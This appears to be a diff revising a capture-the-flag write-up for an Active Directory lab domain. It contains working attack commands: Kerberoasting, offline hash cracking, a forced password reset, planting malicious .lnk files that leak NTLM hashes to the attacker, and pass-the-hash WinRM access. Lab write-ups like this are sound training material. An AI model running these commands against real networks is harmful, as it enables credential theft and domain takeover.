@@ -26,9 +26,11 @@ Leaked DB → Hash cracking → Kerberoasting (r.haggard)
 Add the following entries to `/etc/hosts`:
 
 ```
-<TARGET_IP> buildingmagic.local
-<TARGET_IP> dc01.buildingmagic.local
+10.1.130.199 buildingmagic.local
+10.1.130.199 dc01.buildingmagic.local
 ```
+
+> Replace `10.1.130.199` with the IP shown on the lab page when you spin up the machine.
 
 ---
 
@@ -139,7 +141,7 @@ Ingest the `.zip` into BloodHound and run the **Kerberoastable Users** query.
 Request the TGS ticket for `r.haggard`:
 
 ```bash
-GetUserSPNs.py buildingmagic.local/r.widdleton:lilronron -dc-ip 10.1.130.199 -request-user r.haggard -outputfile hash.txt
+impacket-GetUserSPNs buildingmagic.local/r.widdleton:lilronron -dc-ip 10.1.130.199 -request-user r.haggard -outputfile kerberoast.txt
 ```
 
 ```
@@ -151,13 +153,13 @@ HOGWARTS-DC/r.hagrid.WIZARDING.THM:60111  r.haggard            2025-05-15 17:09:
 Alternative via NetExec:
 
 ```bash
-nxc ldap 10.1.130.199 -u 'r.widdleton' -p 'lilronron' --kerberoasting hash.txt
+nxc ldap 10.1.130.199 -u 'r.widdleton' -p 'lilronron' --kerberoasting kerberoast.txt
 ```
 
-Crack offline with Hashcat (auto-detects `krb5tgs`):
+Crack offline with Hashcat (`-m 13100` = `krb5tgs` RC4-HMAC):
 
 ```bash
-hashcat hash.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
 ```
 
 **Cracked:** `r.haggard : rubeushagrid`
@@ -202,7 +204,7 @@ bloodyAD -u r.haggard -p rubeushagrid -d buildingmagic.local -H 10.1.130.199 set
 **rpcclient alternative:**
 
 ```bash
-rpcclient -U 'BUILDINGMAGIC.LOCAL/r.haggard%rubeushagrid' 10.1.82.171 -c "setuserinfo2 H.POTCH 23 'NewPass123!'"
+rpcclient -U 'BUILDINGMAGIC.LOCAL/r.haggard%rubeushagrid' 10.1.130.199 -c "setuserinfo2 H.POTCH 23 'NewPass123!'"
 ```
 
 Check share access:
@@ -230,7 +232,8 @@ With write access to a share, we plant a malicious `.lnk` file. When any user br
 ### Step 1 — Generate malicious files
 
 ```bash
-ntlm_theft.py --verbose --generate modern --server <TUN0_IP> --filename "meetingXYZ"
+# Find your tun0 IP first: ip addr show tun0
+ntlm_theft.py --verbose --generate modern --server <YOUR_TUN0_IP> --filename "meetingXYZ"
 ```
 
 ### Step 2 — Start Responder
@@ -253,8 +256,10 @@ smbclient //10.1.130.199/File-Share -U 'BUILDINGMAGIC.LOCAL/h.potch%NewPass123!'
 [SMB] NTLMv2-SSP Hash     : h.grangon::BUILDINGMAGIC:49af3a2a34c1a4d4:...
 ```
 
+Copy the full hash line from Responder output into `ntlmv2.txt`, then crack it:
+
 ```bash
-hashcat hash.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt
 ```
 
 **Cracked:** `h.grangon : magic4ever`
@@ -346,7 +351,7 @@ DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c0
 Enumerate all domain users:
 
 ```
-*Evil-WinRM* PS C:\Users\h.grangon\Documents> net users
+*Evil-WinRM* PS C:\Users\h.grangon\Documents> net user /domain
 
 a.flatch    Administrator    Guest
 h.grangon   h.potch          krbtgt
@@ -372,7 +377,7 @@ nxc smb BUILDINGMAGIC.LOCAL -u users.txt -H '520126a03f5d5a8d836f1c4f34ede7ce' -
 ## Root Flag
 
 ```bash
-evil-winrm -u 'a.flatch' -H '520126a03f5d5a8d836f1c4f34ede7ce' -i BUILDINGMAGIC.LOCAL
+evil-winrm -u 'a.flatch' -H '520126a03f5d5a8d836f1c4f34ede7ce' -i 10.1.130.199
 ```
 
 ```
@@ -392,7 +397,7 @@ d-----  6/12/2025  1:37 PM        nssm-2.24
 | Leaked DB | Non-salted hash cracking | CrackStation / Hashcat |
 | SMB enumeration | Credential validation + share listing | NetExec |
 | AD enumeration | RID cycling, BloodHound collection | NetExec, BloodHound |
-| Kerberoasting | TGS request + offline crack | GetUserSPNs.py, Hashcat |
+| Kerberoasting | TGS request + offline crack | impacket-GetUserSPNs, Hashcat |
 | ACL abuse | ForcePasswordChange | bloodyAD |
 | NTLM theft | Malicious `.lnk` in writable share | ntlm_theft.py, Responder |
 | Lateral movement | WinRM access | Evil-WinRM |
